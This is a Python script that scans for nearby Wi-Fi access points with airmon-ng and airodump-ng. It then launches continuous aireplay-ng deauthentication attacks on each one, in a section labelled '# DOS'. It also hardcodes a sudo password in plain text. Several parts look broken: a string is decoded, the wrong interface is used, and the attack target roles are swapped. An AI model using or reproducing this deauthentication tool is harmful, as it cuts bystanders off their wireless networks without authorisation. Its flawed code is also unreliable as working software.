import subprocess
import re


# Get mac addresses connected to device
def get_connected_devices_mac_addresses():
    try:
        result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
        output_lines = result.stdout.split('\n')
        mac_addresses = []

        for line in output_lines:
            if 'link/ether' in line:
                parts = line.strip().split()
                mac_address = parts[1]
                mac_addresses.append(mac_address)

        return mac_addresses
    except Exception as e:
        print(f"Error occurred: {e}")
        return None


# Get and print MAC addresses of connected devices
mac_addresses = get_connected_devices_mac_addresses()
if mac_addresses:
    print("MAC addresses of connected devices:")
    for mac in mac_addresses:
        print(mac)
else:
    print("Failed to retrieve MAC addresses.")


# Collect all BSSID and channels
def get_bssids(adapter, adapterMonitor):
    try:
        password = "leo"  # Replace with sudo password
        subprocess.run(["sudo", "airmon-ng", "start", adapter], input=f"{password}\n", check=True, text=True)

        command = ['sudo', 'airodump-ng', '-w', 'output_file', '--output-format', 'csv', adapterMonitor]
        output = subprocess.run(command, input=f"{password}\n", encoding='ascii', capture_output=True, text=True)
        lines = output.decode('utf-8').split('\n')
        bssids = []
        for line in lines:
            if line.startswith('BSSID'):
                bssid = line.split(',')[0].split()[1]
                bssids.append(bssid)
        return bssids
    except subprocess.CalledProcessError as e:
        print("Command execution failed:", e)
        return []


# Get the BSSIDs
adapter = 'eth0'  # Change this to your wireless interface name
adapterMonitor = 'eth0mon'
bssid_list = get_bssids(adapter, adapterMonitor)
print("List of BSSIDs:")
print(bssid_list)


# DOS
time = '60'
ap1 = mac_addresses[0]
ath0 = 'wlan0'
for bssid in bssid_list:
    result = subprocess.run(['timeout', time, 'aireplay-ng', '--deauth', '0', '-a', ap1, '-c', bssid, ath0])